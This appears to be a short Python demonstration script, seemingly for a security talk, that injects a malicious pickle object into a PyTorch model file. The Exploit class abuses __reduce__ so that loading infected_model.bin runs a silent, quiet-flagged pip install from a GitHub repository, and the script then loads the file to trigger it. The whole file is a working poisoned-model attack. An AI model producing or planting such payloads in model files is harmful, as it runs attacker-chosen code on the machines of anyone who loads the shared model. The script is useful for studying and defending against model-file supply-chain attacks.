import pydoc
import subprocess
import venv

import torch



class Exploit:
    def __reduce__(self):
        return subprocess.Popen, (
            '','python -m pip install git+https://github.com/madgetr/rsac-demo-package  -q -q -q --no-input --exists-action i --isolated',
        ), None, None, None

def make_infected_model():
    # Load the original model
    malicious_model = torch.load("pytorch_model.bin")

    # Add the malicious class to the end of the model
    malicious_model["exploit"] = Exploit()


    # Save the malicious model as a new file
    torch.save(malicious_model, "infected_model.bin")


if __name__ == "__main__":
    make_infected_model()
    torch.load("infected_model.bin")